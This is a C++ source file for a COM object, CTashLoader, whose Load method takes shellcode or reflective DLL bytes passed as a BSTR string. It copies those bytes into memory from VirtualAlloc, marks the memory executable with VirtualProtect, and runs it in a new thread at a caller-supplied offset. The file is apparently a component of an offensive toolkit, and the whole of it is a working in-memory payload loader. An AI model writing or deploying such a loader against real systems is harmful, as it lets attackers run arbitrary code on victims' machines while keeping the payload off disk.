// TashLoader.cpp : Implementation of CTashLoader

#include "stdafx.h"
#include "TashLoader.h"


// CTashLoader


/**
* sCode - shellcode/reflective DLL bytes, will be fixed from BSTR
* sParam - parameter to pass to new thread, will NOT be fixed from BSTR
* dwOffset - where in sCode buffer the entry point is (i.e. reflective loader export)
* dwErr - returns win32 user errno
*/
STDMETHODIMP CTashLoader::Load(BSTR sCode, BSTR sParam, ULONG dwOffset, ULONG* dwErr)
{
	do
	{
		UINT dwSize = SysStringLen(sCode);

		PVOID pAddr = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE); 

		if (pAddr == NULL)
			break;

		// every-other byte memcpy because of BSTR wchar_t
		for (UINT i = 0; i < dwSize; ++i)
		{
			((BYTE*)pAddr)[i] = ((BYTE*)sCode)[i * 2];
			//printf("%02x ", ((BYTE*)pAddr)[i]);
		}

		DWORD dwOldProtect;

		if (!VirtualProtect(pAddr, dwSize, PAGE_EXECUTE_READ, &dwOldProtect))
			break;

		HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ((BYTE*)pAddr + dwOffset), (PVOID)sParam, 0, NULL);

		if (hThread == NULL)
			break;

		// wait for shellcode/reflective DLL to complete its operations, process will die quickly after we return
		WaitForSingleObject(hThread, INFINITE);

		SetLastError(ERROR_SUCCESS);
	} while (0);
	/* */

	*dwErr = GetLastError();
	return S_OK;
}